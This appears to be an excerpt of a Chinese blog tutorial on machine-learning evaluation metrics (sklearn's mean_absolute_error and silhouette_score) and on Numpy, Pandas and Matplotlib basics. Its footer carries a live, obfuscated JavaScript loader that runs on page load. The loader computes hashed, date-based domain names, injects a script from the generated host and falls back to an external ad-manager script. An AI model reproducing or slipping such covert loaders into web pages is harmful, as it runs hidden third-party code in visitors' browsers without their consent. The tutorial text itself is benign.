mtight">1</span></span></span></span><span class=""><span class="pstrut" style="height: 3.05em"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.27767em"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">∣</span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.10764em">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span></span></span></span></span></span></span></p> <p><strong>对应sklearn包</strong> ：</p> <p><code>sklearn.metrics.mean_absolute_error(y_true, y_pred, *, sample_weight=None, multioutput='uniform_average')</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,) or (n_samples, n_outputs)</strong> 真实目标值。</td>
</tr>
<tr>
<td align="left"><strong>y_pred</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,) or (n_samples, n_outputs)</strong> 预测目标值。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), optional</strong> 样本权重。</td>
</tr>
<tr>
<td align="left"><strong>multioutput</strong></td>
<td align="left">
<strong>string in [‘raw_values’, ‘uniform_average’] or array-like of shape (n_outputs)</strong> 定义多个输出值的汇总。类似数组的值定义了用于平均误差的权重。 - <strong>‘raw_values’：</strong> 如果是多输出格式的输入，则返回完整的错误集。 - <strong>‘uniform_average’：</strong> 所有输出的误差均以相同的权重平均。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>loss</strong></td>
<td align="left">
<strong>float or ndarray of floats</strong> 如果多输出为‘raw_values’，则分别为每个输出返回均值绝对错误。如果多输出是‘uniform_average’或权重的ndarray，则将返回所有输出错误的加权平均值。 MAE输出为非负浮点。最佳值为0.0。</td>
</tr></tbody>
</table>
</li>
</ol> 
<h3>
<a id="34__711"></a>3.4. 无监督任务</h3> 
<p><strong>轮廓系数</strong>：适应于实际类别信息未知的情况。对于单个样本，设a是与它同类别中其它样本的 平均距离，b是与它距离最近不同类别中样本的平均距离，定义为：<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
     
      
       
        
         S
        
        
         =
        
        
         
          
           b
          
          
           −
          
          
           a
          
         
         
          
           m
          
          
           a
          
          
           x
          
          
           (
          
          
           a
          
          
           ,
          
          
           b
          
          
           )
          
         
        
       
       
         S=frac{b-a}{max(a,b)} 
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.30744em;vertical-align: -0.936em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.37144em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault">b</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.936em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span><br> <strong>对应sklearn包</strong> ：</p> 
<p><code>sklearn.metrics.silhouette_score(X, labels, *, metric='euclidean', sample_size=None, random_state=None, **kwds)</code></p> 
<p><strong>参数</strong>：</p> 
<table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>X</strong></td>
<td align="left">
<strong>array [n_samples_a, n_samples_a] if metric == “precomputed”, or, [n_samples_a, n_features] otherwise</strong> 样本之间的成对距离数组或特征数组。</td>
</tr>
<tr>
<td align="left"><strong>labels</strong></td>
<td align="left">
<strong>array, shape = [n_samples]</strong> 每个样本的预测标签。</td>
</tr>
<tr>
<td align="left"><strong>metric</strong></td>
<td align="left">
<strong>string, or callable</strong> 计算特征阵列中实例之间的距离时使用的度量。如果metric是字符串，则它必须是metrics.pairwise.pairwise_distances允许的选项之一。如果X是距离数组本身，则使用metric=“precomputed”。</td>
</tr>
<tr>
<td align="left"><strong>sample_size</strong></td>
<td align="left">
<strong>int or None</strong> 在数据的随机子集上计算轮廓系数时要使用的样本大小。如果sample_size为None，则不使用采样。</td>
</tr>
<tr>
<td align="left"><strong>random_state</strong></td>
<td align="left">
<strong>int, RandomState instance or None, optional (default=None)</strong> 确定用于选择样本子集的随机数生成。当sample_size不为None时使用。在多个函数调用之间传递int以获得可重复的结果。请参阅<a href="http://scikit-learn.org.cn/lists/91.html#%E5%8F%82%E6%95%B0">词汇表</a>。</td>
</tr>
<tr>
<td align="left">**kwds</td>
<td align="left">
<strong>optional keyword parameters</strong> 任何其他参数都直接传递给距离函数。如果使用scipy.spatial.distance度量，则参数仍取决于度量。有关用法示例，请参见scipy文档。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
<table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>silhouette</strong></td>
<td align="left">
<strong>float</strong> 所有样本的平均轮廓系数。</td>
</tr></tbody>
</table>
<h2>
<a id="4_python_738"></a>4. 机器学习用到的python库</h2> 
<h3>
<a id="41_Numpy_740"></a>4.1. Numpy</h3> 
<ul>
<li>Numpy：通常用来进行矢量化的计算</li>
<li>常用函数：</li>
</ul> 
<table>
<thead><tr>
<th><strong>创建数组</strong></th>
<th></th>
</tr></thead>
<tbody>
<tr>
<td>np.array()</td>
<td>用于创建一维或多维数组</td>
</tr>
<tr>
<td>np.arange()</td>
<td>在给定的间隔内返回具有一定步长的整数</td>
</tr>
<tr>
<td>np.linspace()</td>
<td>创建一个具有指定间隔的浮点数的数组</td>
</tr>
<tr>
<td>np.random.randint()</td>
<td>在一个范围内生成n个随机整数样本</td>
</tr>
<tr>
<td>np.zeros()</td>
<td>创建一个全部为0的数组</td>
</tr>
<tr>
<td>np.ones()</td>
<td>创建一个全部为1的数组</td>
</tr>
<tr>
<td>np.full()</td>
<td>创建一个单独值的n维数组</td>
</tr>
</tbody>
</table> 
<table>
<thead><tr>
<th>数组操作</th>
<th></th>
</tr></thead>
<tbody>
<tr>
<td>np.min()</td>
<td>返回数组中的最小值</td>
</tr>
<tr>
<td>np.max()</td>
<td>返回数组中的最大值</td>
</tr>
<tr>
<td>np.mean()</td>
<td>返回数组的平均数</td>
</tr>
<tr>
<td>np.median()</td>
<td>返回数组的中位数</td>
</tr>
<tr>
<td>np.np.sort()</td>
<td>对数组排序</td>
</tr>
</tbody>
</table>
<ul>
<li>优点： 
  <ol>
<li>numpy的基本对象是ndarray，最大的优势在于用它进行多维数组的计算，不用写多重for循环，直接可以进行矢量化的运算</li>
<li>封装了vectorize函数，可以把处理标量的函数矢量化，极大地提高了计算速度</li>
</ol> </li>
<li>缺点： 
  <ol><li>ndarray中的数据类型必须相同，于是有了pandas可以处理不同数据类型的数据集</li></ol> </li>
</ul> 
<h3>
<a id="42_Pandas_772"></a>4.2. Pandas</h3> 
<ul>
<li>Pandas： 通常用来处理结构化的数据</li>
<li>优点： 
  <ol>
<li>数据结构Series，理解为一个一维的数组，只是index名称可以自己改动。类似于定长的有序字典，有index和value</li>
<li>数据结构DataFrame，理解为一个二维数组，索引有两个维度，可更改。一行一样本，一列一特征。每一行都可以看作一个样本，每一列都可以看作一个Series</li>
<li>封装的to_datetime函数转换日期数据类型，支持大多数的日期格式，而且转换后的datetime类型数据支持日期运算</li>
</ol> </li>
</ul> 
<h3>
<a id="43_Matplotlib_780"></a>4.3. Matplotlib</h3> 
<ul><li>Matplotlib： 用来绘制出直观的图表</li></ul> 
<blockquote> 
 <p><code>Figure</code>：是指整个图形，也就是一张画布，包括了所有的元素，如标题，轴线等；<br> <code>Axes</code>：绘制 2D 图像的实际区域，也称为轴域区，或者绘图区；<br> <code>Axis</code>：是指图形的水平轴和垂直轴，包括轴的长度、轴的标签和轴的刻度等；</p> 
 <p><code>xlabel</code>、<code>ylabel</code>: 设置横轴、纵轴标签及大小</p> 
 <p><code>xticks</code>、<code>yticks</code>： 设置坐标轴刻度的字体大小</p> 
 <p><code>plt.legend()</code>：添加图例</p> 
 <p><code>plt.scatter()</code>：函数用于生成一个scatter<strong>散点图</strong></p> 
 <p><code>plt.plot(x, y, format_string, **kwargs) </code>：绘制函数曲线（绘制坐标图）</p> 
</blockquote>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>